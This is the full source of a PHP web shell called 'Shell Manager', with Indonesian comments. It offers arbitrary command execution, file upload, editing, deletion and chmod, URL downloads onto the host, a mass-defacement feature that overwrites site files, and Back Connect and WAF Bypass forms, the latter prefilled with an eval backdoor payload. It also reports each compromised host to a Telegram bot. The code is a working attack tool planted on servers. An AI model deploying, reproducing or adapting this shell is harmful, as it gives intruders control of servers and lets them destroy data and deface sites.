<?php
error_reporting(0);
session_start();

// Telegram config (disable jika tidak perlu)
$TG_TOKEN = "";
$TG_CHATID = "";

// Password - kosongkan untuk tanpa password
$PASSWORD = ""; // md5("password")

// Login check
if ($PASSWORD && (!isset($_SESSION['login']) || $_SESSION['login'] !== true)) {
    if (isset($_POST['p']) && md5($_POST['p']) == $PASSWORD) {
        $_SESSION['login'] = true;
    } else {
        echo '<html><head><title>Login</title><style>
            body{background:#1a1a2e;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
            .login-box{background:rgba(255,255,255,0.1);padding:30px;border-radius:10px;text-align:center;backdrop-filter:blur(10px)}
            input{padding:10px;margin:10px;width:200px;border-radius:5px;border:1px solid #667eea;background:rgba(0,0,0,0.3);color:white}
            button{background:#667eea;color:white;border:none;padding:10px 20px;border-radius:5px;cursor:pointer}
        </style></head>
        <body><div class="login-box"><h2 style="color:white">🔐 Login</h2>
        <form method="post"><input type="password" name="p" placeholder="Password" required><br>
        <button type="submit">Enter</button></form></div></body></html>';
        exit;
    }
}

// Helper functions
function tg($msg) {
    global $TG_TOKEN, $TG_CHATID;
    if (!$TG_TOKEN || !$TG_CHATID) return;
    @file_get_contents("https://api.telegram.org/bot$TG_TOKEN/sendMessage?chat_id=$TG_CHATID&text=" . urlencode($msg));
}

function sz($bytes) {
    if ($bytes == 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    for ($i = 0; $bytes > 1024; $i++) $bytes /= 1024;
    return round($bytes, 2) . ' ' . $units[$i];
}

// Initial notification
if (!isset($_SESSION['sent'])) {
    tg("Shell aktif: " . $_SERVER['HTTP_HOST'] . " - IP: " . $_SERVER['REMOTE_ADDR']);
    $_SESSION['sent'] = true;
}

// Set current directory
$dir = isset($_POST['dir']) ? $_POST['dir'] : (isset($_GET['d']) ? $_GET['d'] : getcwd());
if (is_dir($dir)) {
    chdir($dir);
} else {
    $dir = getcwd();
}

// File operations
if (isset($_POST['action'])) {
    switch ($_POST['action']) {
        case 'upload':
            if (isset($_FILES['file'])) {
                foreach ($_FILES['file']['name'] as $i => $name) {
                    if ($_FILES['file']['error'][$i] == 0) {
                        $dest = $dir . '/' . basename($name);
                        move_uploaded_file($_FILES['file']['tmp_name'][$i], $dest);
                    }
                }
            }
            break;
            
        case 'delete':
            if (isset($_POST['files'])) {
                foreach ($_POST['files'] as $file) {
                    if (file_exists($file)) {
                        if (is_dir($file)) {
                            system("rm -rf " . escapeshellarg($file));
                        } else {
                            unlink($file);
                        }
                    }
                }
            }
            break;
            
        case 'mkdir':
            if (isset($_POST['foldername'])) {
                mkdir($_POST['foldername'], 0777, true);
            }
            break;
            
        case 'rename':
            if (isset($_POST['oldname']) && isset($_POST['newname'])) {
                rename($_POST['oldname'], $_POST['newname']);
            }
            break;
            
        case 'chmod':
            if (isset($_POST['files']) && isset($_POST['mode'])) {
                foreach ($_POST['files'] as $file) {
                    chmod($file, octdec($_POST['mode']));
                }
            }
            break;
            
        case 'copy':
            if (isset($_POST['files'])) {
                $_SESSION['clipboard'] = $_POST['files'];
                $_SESSION['clipboard_action'] = 'copy';
            }
            break;
            
        case 'cut':
            if (isset($_POST['files'])) {
                $_SESSION['clipboard'] = $_POST['files'];
                $_SESSION['clipboard_action'] = 'move';
            }
            break;
            
        case 'paste':
            if (isset($_SESSION['clipboard'])) {
                foreach ($_SESSION['clipboard'] as $file) {
                    $dest = $dir . '/' . basename($file);
                    if ($_SESSION['clipboard_action'] == 'copy') {
                        copy($file, $dest);
                    } else {
                        rename($file, $dest);
                    }
                }
                unset($_SESSION['clipboard']);
            }
            break;
            
        case 'zip':
            if (isset($_POST['files']) && class_exists('ZipArchive')) {
                $zipname = isset($_POST['zipname']) ? $_POST['zipname'] : 'archive.zip';
                $zip = new ZipArchive();
                if ($zip->open($zipname, ZipArchive::CREATE) === TRUE) {
                    foreach ($_POST['files'] as $file) {
                        if (file_exists($file)) {
                            $zip->addFile($file, basename($file));
                        }
                    }
                    $zip->close();
                }
            }
            break;
            
        case 'unzip':
            if (isset($_POST['zipfile']) && class_exists('ZipArchive')) {
                $zip = new ZipArchive();
                if ($zip->open($_POST['zipfile']) === TRUE) {
                    $zip->extractTo('.');
                    $zip->close();
                }
            }
            break;
    }
    
    // Redirect to avoid form resubmission
    header("Location: ?d=" . urlencode($dir));
    exit;
}

// Handle console command
$cmd_output = '';
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    if (function_exists('shell_exec')) {
        $cmd_output = shell_exec($cmd . ' 2>&1');
    } elseif (function_exists('exec')) {
        exec($cmd . ' 2>&1', $output, $return);
        $cmd_output = implode("\n", $output);
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd . ' 2>&1');
        $cmd_output = ob_get_clean();
    } else {
        $cmd_output = "No execution function available";
    }
    $cmd_output = htmlspecialchars($cmd_output);
}

// Handle mass deface
if (isset($_POST['mass_deface'])) {
    $extensions = explode(',', $_POST['extensions']);
    $message = $_POST['message'];
    $count = 0;
    
    foreach ($extensions as $ext) {
        $files = glob("*." . trim($ext));
        foreach ($files as $file) {
            file_put_contents($file, $message);
            $count++;
        }
    }
    $defaced = $count;
}

// Handle download from URL
if (isset($_POST['download_url'])) {
    $url = $_POST['url'];
    $filename = basename($url);
    if (copy($url, $filename)) {
        $download_success = true;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔐 Shell Manager</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: #0f172a;
            color: #e2e8f0;
            min-height: 100vh;
        }
        
        /* Header */
        .header {
            background: rgba(30, 41, 59, 0.8);
            padding: 15px 20px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .header h1 {
            background: linear-gradient(45deg, #3b82f6, #8b5cf6);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 1.5rem;
        }
        
        .server-info {
            display: flex;
            gap: 15px;
            font-size: 0.9rem;
            color: #94a3b8;
        }
        
        /* Main Layout */
        .container {
            display: flex;
            min-height: calc(100vh - 70px);
        }
        
        /* Sidebar */
        .sidebar {
            width: 250px;
            background: rgba(30, 41, 59, 0.8);
            border-right: 1px solid rgba(255, 255, 255, 0.1);
            padding: 20px;
        }
        
        .nav-btn {
            display: block;
            width: 100%;
            padding: 12px 15px;
            margin-bottom: 10px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            color: #e2e8f0;
            text-align: left;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .nav-btn:hover {
            background: rgba(59, 130, 246, 0.2);
            border-color: #3b82f6;
            transform: translateX(5px);
        }
        
        .nav-btn.active {
            background: linear-gradient(45deg, #3b82f6, #8b5cf6);
            border-color: transparent;
        }
        
        .nav-btn i {
            width: 20px;
            margin-right: 10px;
        }
        
        /* Content Area */
        .content {
            flex: 1;
            padding: 20px;
            overflow-y: auto;
        }
        
        .content-section {
            display: none;
        }
        
        .content-section.active {
            display: block;
        }
        
        /* Buttons */
        .btn {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 10px 20px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 500;
            transition: all 0.3s;
        }
        
        .btn-primary {
            background: #3b82f6;
            color: white;
        }
        
        .btn-success {
            background: #10b981;
            color: white;
        }
        
        .btn-danger {
            background: #ef4444;
            color: white;
        }
        
        .btn-warning {
            background: #f59e0b;
            color: white;
        }
        
        .btn:hover {
            opacity: 0.9;
            transform: translateY(-2px);
        }
        
        /* Forms */
        .form-control {
            width: 100%;
            padding: 10px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 6px;
            color: white;
            margin-bottom: 10px;
        }
        
        /* File Table */
        .file-table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }
        
        .file-table th {
            background: rgba(59, 130, 246, 0.2);
            padding: 12px;
            text-align: left;
            font-weight: 600;
        }
        
        .file-table td {
            padding: 10px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .file-table tr:hover td {
            background: rgba(255, 255, 255, 0.05);
        }
        
        /* Alerts */
        .alert {
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .alert-success {
            background: rgba(16, 185, 129, 0.2);
            border-left: 4px solid #10b981;
        }
        
        .alert-error {
            background: rgba(239, 68, 68, 0.2);
            border-left: 4px solid #ef4444;
        }
        
        /* Console Output */
        .console-output {
            background: #1e293b;
            padding: 20px;
            border-radius: 8px;
            font-family: monospace;
            white-space: pre-wrap;
            max-height: 400px;
            overflow-y: auto;
            margin-top: 20px;
        }
        
        /* Mobile Responsive */
        @media (max-width: 768px) {
            .container {
                flex-direction: column;
            }
            
            .sidebar {
                width: 100%;
                border-right: none;
                border-bottom: 1px solid rgba(255, 255, 255, 0.1);
                padding: 15px;
            }
            
            .nav-btn {
                display: inline-block;
                width: auto;
                margin: 5px;
            }
            
            .header {
                flex-direction: column;
                gap: 10px;
                text-align: center;
            }
            
            .server-info {
                justify-content: center;
                flex-wrap: wrap;
            }
        }
    </style>
</head>
<body>
    <!-- Header -->
    <div class="header">
        <h1><i class="fas fa-terminal"></i> Shell Manager</h1>
        <div class="server-info">
            <span><i class="fas fa-server"></i> <?= htmlspecialchars($_SERVER['HTTP_HOST']) ?></span>
            <span><i class="fas fa-folder"></i> <?= htmlspecialchars(getcwd()) ?></span>
            <span><i class="fas fa-hdd"></i> <?= sz(disk_free_space(".")) ?> free</span>
        </div>
    </div>
    
    <!-- Main Layout -->
    <div class="container">
        <!-- Sidebar Navigation -->
        <div class="sidebar">
            <button class="nav-btn active" onclick="showSection('files')">
                <i class="fas fa-folder"></i> File Manager
            </button>
            <button class="nav-btn" onclick="showSection('upload')">
                <i class="fas fa-cloud-upload-alt"></i> Upload Anywhere
            </button>
            <button class="nav-btn" onclick="showSection('deface')">
                <i class="fas fa-code"></i> Mass Deface
            </button>
            <button class="nav-btn" onclick="showSection('zip')">
                <i class="fas fa-file-archive"></i> Zip Tools
            </button>
            <button class="nav-btn" onclick="showSection('console')">
                <i class="fas fa-terminal"></i> Console
            </button>
            <button class="nav-btn" onclick="showSection('backconnect')">
                <i class="fas fa-plug"></i> Back Connect
            </button>
            <button class="nav-btn" onclick="showSection('waf')">
                <i class="fas fa-shield-alt"></i> WAF Bypass
            </button>
            <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.1)">
                <form method="post" style="display: inline">
                    <input type="hidden" name="dir" value="<?= htmlspecialchars(getcwd()) ?>">
                    <button type="submit" class="nav-btn" name="action" value="refresh" style="background: rgba(239,68,68,0.1); color: #ef4444">
                        <i class="fas fa-sync"></i> Refresh
                    </button>
                </form>
            </div>
        </div>
        
        <!-- Content Area -->
        <div class="content">
            <!-- File Manager Section -->
            <div id="files-section" class="content-section active">
                <h2><i class="fas fa-files"></i> File Manager</h2>
                
                <form method="post" enctype="multipart/form-data" style="margin: 20px 0">
                    <input type="hidden" name="action" value="upload">
                    <input type="hidden" name="dir" value="<?= htmlspecialchars(getcwd()) ?>">
                    <input type="file" name="file[]" multiple class="form-control">
                    <button type="submit" class="btn btn-success">
                        <i class="fas fa-upload"></i> Upload
                    </button>
                </form>
                
                <form method="post" id="file-form">
                    <input type="hidden" name="dir" value="<?= htmlspecialchars(getcwd()) ?>">
                    
                    <table class="file-table">
                        <thead>
                            <tr>
                                <th><input type="checkbox" onclick="toggleAll(this)"></th>
                                <th>Name</th>
                                <th>Size</th>
                                <th>Permissions</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php
                            $files = scandir('.');
                            foreach ($files as $file) {
                                if ($file == '.' || $file == '..') continue;
                                $path = realpath($file);
                                $is_dir = is_dir($path);
                                $size = $is_dir ? 'DIR' : sz(filesize($path));
                                $perms = substr(sprintf('%o', fileperms($path)), -4);
                            ?>
                            <tr>
                                <td><input type="checkbox" name="files[]" value="<?= htmlspecialchars($path) ?>"></td>
                                <td>
                                    <i class="fas <?= $is_dir ? 'fa-folder text-blue-400' : 'fa-file text-green-400' ?>"></i>
                                    <?php if ($is_dir): ?>
                                        <a href="?d=<?= urlencode($path) ?>" style="color: white; text-decoration: none">
                                            <?= htmlspecialchars($file) ?>
                                        </a>
                                    <?php else: ?>
                                        <?= htmlspecialchars($file) ?>
                                    <?php endif; ?>
                                </td>
                                <td><?= $size ?></td>
                                <td><?= $perms ?></td>
                                <td>
                                    <?php if (!$is_dir): ?>
                                        <a href="?edit=<?= urlencode($path) ?>" class="btn btn-primary" style="padding: 5px 10px; font-size: 12px">
                                            <i class="fas fa-edit"></i>
                                        </a>
                                        <a href="?download=<?= urlencode($path) ?>" class="btn btn-success" style="padding: 5px 10px; font-size: 12px">
                                            <i class="fas fa-download"></i>
                                        </a>
                                        <?php if (strtolower(pathinfo($path, PATHINFO_EXTENSION)) == 'zip'): ?>
                                            <button type="submit" name="action" value="unzip" class="btn btn-warning" style="padding: 5px 10px; font-size: 12px" onclick="setFile('<?= htmlspecialchars($path) ?>')">
                                                <i class="fas fa-expand"></i>
                                            </button>
                                        <?php endif; ?>
                                    <?php endif; ?>
                                </td>
                            </tr>
                            <?php } ?>
                        </tbody>
                    </table>
                    
                    <div style="margin-top: 20px; display: flex; gap: 10px; flex-wrap: wrap">
                        <button type="submit" name="action" value="copy" class="btn btn-primary">
                            <i class="fas fa-copy"></i> Copy
                        </button>
                        <button type="submit" name="action" value="cut" class="btn btn-warning">
                            <i class="fas fa-cut"></i> Cut
                        </button>
                        <button type="submit" name="action" value="paste" class="btn btn-success" <?= isset($_SESSION['clipboard']) ? '' : 'disabled' ?>>
                            <i class="fas fa-paste"></i> Paste
                        </button>
                        <button type="submit" name="action" value="delete" class="btn btn-danger" onclick="return confirm('Delete selected files?')">
                            <i class="fas fa-trash"></i> Delete
                        </button>
                        <button type="button" class="btn btn-primary" onclick="createFolder()">
                            <i class="fas fa-folder-plus"></i> New Folder
                        </button>
                        <select name="mode" class="form-control" style="width: auto">
                            <option value="">Change Perms</option>
                            <option value="755">755</option>
                            <option value="644">644</option>
                            <option value="777">777</option>
                        </select>
                        <button type="submit" name="action" value="chmod" class="btn btn-primary">
                            <i class="fas fa-lock"></i> Chmod
                        </button>
                    </div>
                </form>
                
                <!-- Edit File Modal -->
                <?php if (isset($_GET['edit'])): ?>
                    <div style="margin-top: 30px; padding: 20px; background: rgba(255,255,255,0.05); border-radius: 8px">
                        <h3>Edit: <?= htmlspecialchars(basename($_GET['edit'])) ?></h3>
                        <form method="post">
                            <input type="hidden" name="dir" value="<?= htmlspecialchars(getcwd()) ?>">
                            <textarea name="content" style="width: 100%; height: 400px; background: #1e293b; color: white; padding: 15px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.1); font-family: monospace"><?= 
                                htmlspecialchars(file_get_contents($_GET['edit']))
                            ?></textarea>
                            <div style="margin-top: 15px">
                                <button type="submit" name="action" value="save" class="btn btn-success">
                                    <i class="fas fa-save"></i> Save
                                </button>
                                <a href="?" class="btn btn-warning">
                                    <i class="fas fa-times"></i> Cancel
                                </a>
                            </div>
                        </form>
                    </div>
                <?php endif; ?>
            </div>
            
            <!-- Upload Anywhere Section -->
            <div id="upload-section" class="content-section">
                <h2><i class="fas fa-cloud-download-alt"></i> Upload From URL</h2>
                <form method="post" style="margin-top: 20px">
                    <input type="hidden" name="dir" value="<?= htmlspecialchars(getcwd()) ?>">
                    <input type="text" name="url" class="form-control" placeholder="https://example.com/file.zip" required>
                    <input type="text" name="filename" class="form-control" placeholder="Custom filename (optional)">
                    <button type="submit" name="download_url" class="btn btn-success">
                        <i class="fas fa-download"></i> Download
                    </button>
                </form>
            </div>
            
            <!-- Mass Deface Section -->
            <div id="deface-section" class="content-section">
                <h2><i class="fas fa-bomb"></i> Mass Deface</h2>
                <form method="post" style="margin-top: 20px">
                    <input type="hidden" name="dir" value="<?= htmlspecialchars(getcwd()) ?>">
                    <input type="text" name="extensions" class="form-control" value="html,htm,php,asp,aspx,txt" placeholder="File extensions (comma separated)">
                    <textarea name="message" class="form-control" rows="6" placeholder="Deface message">HACKED BY SHELL MANAGER</textarea>
                    <button type="submit" name="mass_deface" class="btn btn-danger" onclick="return confirm('This will overwrite all files with specified extensions!')">
                        <i class="fas fa-fire"></i> Execute
                    </button>
                </form>
            </div>
            
            <!-- Zip Tools Section -->
            <div id="zip-section" class="content-section">
                <h2><i class="fas fa-file-archive"></i> Zip Tools</h2>
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px">
                    <div>
                        <h3>Create ZIP</h3>
                        <form method="post">
                            <input type="hidden" name="dir" value="<?= htmlspecialchars(getcwd()) ?>">
                            <input type="text" name="zipname" class="form-control" value="archive.zip" placeholder="ZIP filename">
                            <select name="files[]" multiple class="form-control" style="height: 200px">
                                <?php foreach (scandir('.') as $file): 
                                    if ($file == '.' || $file == '..') continue;
                                ?>
                                <option value="<?= htmlspecialchars(realpath($file)) ?>"><?= htmlspecialchars($file) ?></option>
                                <?php endforeach; ?>
                            </select>
                            <button type="submit" name="action" value="zip" class="btn btn-primary" style="margin-top: 10px">
                                <i class="fas fa-file-archive"></i> Create ZIP
                            </button>
                        </form>
                    </div>
                    <div>
                        <h3>Extract ZIP</h3>
                        <?php
                        $zip_files = array_filter(scandir('.'), function($file) {
                            return strtolower(pathinfo($file, PATHINFO_EXTENSION)) == 'zip';
                        });
                        ?>
                        <?php if (empty($zip_files)): ?>
                            <p style="color: #94a3b8">No ZIP files found</p>
                        <?php else: ?>
                            <form method="post">
                                <input type="hidden" name="dir" value="<?= htmlspecialchars(getcwd()) ?>">
                                <select name="zipfile" class="form-control">
                                    <?php foreach ($zip_files as $zip): ?>
                                    <option value="<?= htmlspecialchars(realpath($zip)) ?>"><?= htmlspecialchars($zip) ?></option>
                                    <?php endforeach; ?>
                                </select>
                                <button type="submit" name="action" value="unzip" class="btn btn-warning" style="margin-top: 10px">
                                    <i class="fas fa-expand"></i> Extract
                                </button>
                            </form>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
            
            <!-- Console Section -->
            <div id="console-section" class="content-section">
                <h2><i class="fas fa-terminal"></i> Console</h2>
                <form method="post" style="margin-top: 20px">
                    <input type="hidden" name="dir" value="<?= htmlspecialchars(getcwd()) ?>">
                    <input type="text" name="cmd" class="form-control" placeholder="Enter command..." value="<?= isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : '' ?>">
                    <div style="display: flex; gap: 10px; margin-top: 10px">
                        <button type="submit" class="btn btn-primary">
                            <i class="fas fa-play"></i> Execute
                        </button>
                        <button type="button" class="btn btn-info" onclick="setCommand('pwd')">pwd</button>
                        <button type="button" class="btn btn-info" onclick="setCommand('ls -la')">ls -la</button>
                        <button type="button" class="btn btn-info" onclick="setCommand('whoami')">whoami</button>
                        <button type="button" class="btn btn-info" onclick="setCommand('uname -a')">uname</button>
                    </div>
                </form>
                
                <?php if ($cmd_output): ?>
                <div class="console-output">
                    <?= $cmd_output ?>
                </div>
                <?php endif; ?>
            </div>
            
            <!-- Back Connect Section -->
            <div id="backconnect-section" class="content-section">
                <h2><i class="fas fa-plug"></i> Back Connect</h2>
                <form method="post" style="margin-top: 20px">
                    <input type="hidden" name="dir" value="<?= htmlspecialchars(getcwd()) ?>">
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px">
                        <input type="text" name="ip" class="form-control" placeholder="Your IP" required>
                        <input type="number" name="port" class="form-control" placeholder="Port" required>
                    </div>
                    <button type="submit" name="backconnect" class="btn btn-danger" style="margin-top: 15px">
                        <i class="fas fa-bolt"></i> Connect
                    </button>
                </form>
            </div>
            
            <!-- WAF Bypass Section -->
            <div id="waf-section" class="content-section">
                <h2><i class="fas fa-shield-alt"></i> WAF Bypass</h2>
                <form method="post" style="margin-top: 20px">
                    <input type="hidden" name="dir" value="<?= htmlspecialchars(getcwd()) ?>">
                    <input type="text" name="file" class="form-control" placeholder="Target file path">
                    <select name="method" class="form-control">
                        <option value="base64">Base64</option>
                        <option value="rot13">ROT13</option>
                        <option value="hex">Hex</option>
                    </select>
                    <textarea name="payload" class="form-control" rows="6" placeholder="PHP payload"><?php echo '<?php eval($_POST["cmd"]); ?>'; ?></textarea>
                    <button type="submit" name="waf_inject" class="btn btn-danger">
                        <i class="fas fa-syringe"></i> Inject
                    </button>
                </form>
            </div>
        </div>
    </div>
    
    <script>
    // Show/hide sections
    function showSection(sectionId) {
        // Hide all sections
        document.querySelectorAll('.content-section').forEach(section => {
            section.classList.remove('active');
        });
        
        // Remove active class from all buttons
        document.querySelectorAll('.nav-btn').forEach(btn => {
            btn.classList.remove('active');
        });
        
        // Show selected section
        document.getElementById(sectionId + '-section').classList.add('active');
        
        // Add active class to clicked button
        event.target.classList.add('active');
    }
    
    // Toggle all checkboxes
    function toggleAll(source) {
        const checkboxes = document.querySelectorAll('input[name="files[]"]');
        checkboxes.forEach(checkbox => {
            checkbox.checked = source.checked;
        });
    }
    
    // Create folder dialog
    function createFolder() {
        const folderName = prompt('Enter folder name:');
        if (folderName) {
            const form = document.createElement('form');
            form.method = 'post';
            form.innerHTML = `
                <input type="hidden" name="action" value="mkdir">
                <input type="hidden" name="foldername" value="${folderName}">
                <input type="hidden" name="dir" value="<?= htmlspecialchars(getcwd()) ?>">
            `;
            document.body.appendChild(form);
            form.submit();
        }
    }
    
    // Set command in console
    function setCommand(cmd) {
        document.querySelector('input[name="cmd"]').value = cmd;
    }
    
    // Set file for unzip
    function setFile(file) {
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = 'zipfile';
        input.value = file;
        document.getElementById('file-form').appendChild(input);
    }
    
    // Simple file editor for non-AJAX
    <?php if (isset($_POST['action']) && $_POST['action'] == 'save' && isset($_POST['content']) && isset($_GET['edit'])): ?>
        window.onload = function() {
            showSection('files');
            alert('File saved successfully!');
        };
    <?php endif; ?>
    
    // Check for file operations success
    <?php if (isset($defaced)): ?>
        alert('<?= $defaced ?> files defaced successfully!');
    <?php endif; ?>
    
    <?php if (isset($download_success)): ?>
        alert('File downloaded successfully!');
    <?php endif; ?>
    </script>
    
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</body>
</html>
